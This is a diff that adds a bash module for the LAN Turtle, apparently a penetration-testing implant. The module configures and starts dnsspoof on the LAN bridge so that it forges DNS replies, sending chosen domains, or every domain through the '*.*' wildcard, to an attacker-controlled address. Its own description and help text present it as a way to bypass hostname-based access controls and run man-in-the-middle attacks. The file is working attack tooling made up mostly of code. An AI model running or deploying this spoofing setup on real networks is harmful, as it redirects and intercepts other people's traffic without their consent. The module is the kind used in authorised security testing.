@@ -1,0 +1,60 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+VERSION="1.0"
+DESCRIPTION="dnsspoof forges replies to arbitrary DNS address / pointer queries on the LAN. This is useful in bypassing hostname-based access controls, or in implementing a variety of man-in-the-middle attacks."
+CONF=/tmp/dnsspoof.form
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ITEM_HELP=4}
+: ${DIALOG_ESC=255}
+
+function configure {
+  if [ ! -e /etc/turtle/spoofhost ]; then
+    touch /etc/turtle/spoofhost
+    echo -e "172.16.84.1 example.com" > /etc/turtle/spoofhost
+  fi
+
+  dialog \
+    --help-button \
+    --title "DNSSpoof Configuration (/etc/turtle/spoofhost)" \
+    --editbox /etc/turtle/spoofhost 18 72\
+  2>$CONF
+  return=$?
+  case $return in
+    $DIALOG_OK)
+      cat $CONF | {
+        cat $CONF > /etc/turtle/spoofhost
+        rm $CONF
+      };;
+    $DIALOG_HELP)
+      dialog --title "Help" \
+        --msgbox "\
+DNSSpoof forges replies to arbitrary DNS address / pointer queries on the LAN. This is useful in bypassing hostname-based access controls, or in implementing a variety of man-in-the-middle attacks.\n\n\
+For example, the IP address returned for a client lookup of the domain \"example.com\" can be replaced with that of the LAN Turtle itself, or a 3rd party server.\n\n\
+In this scenario, the computer connected to the Internet through the LAN Turtle attempting to browse to this domain may be redirected to the spoofed IP.\n\n\
+The Spoofhost editor lists the IP address and Domain names to spoof. The default example replaces example.com with the IP address 172.16.84.1 - the LAN Turtle default address.\n\n\
+Wildcards may be used in domain names. For example, \"172.16.84.1 example.*\" would spoof all top-level domains for example, such as .com, .net, .org, etc.\n\n\
+The wildcard *.* will replace all domains.\
+" 20 72
+      configure
+      ;;
+    $DIALOG_CANCEL)
+      rm $CONF;;
+    $DIALOG_ESC)
+      rm $CONF;;
+  esac
+}
+
+function start {
+  echo "dnsspoof -i br-lan -f /etc/turtle/spoofhost > /dev/null 2>/tmp/dnsspoof.log" | at now
+}
+function stop {
+  echo "Killing DNSSpoof with pid:"
+  pidof dnsspoof
+  killall dnsspoof
+}
+function status {
+ if pgrep dnsspoof > /dev/null; then echo "1"; else echo "0"; fi
+}
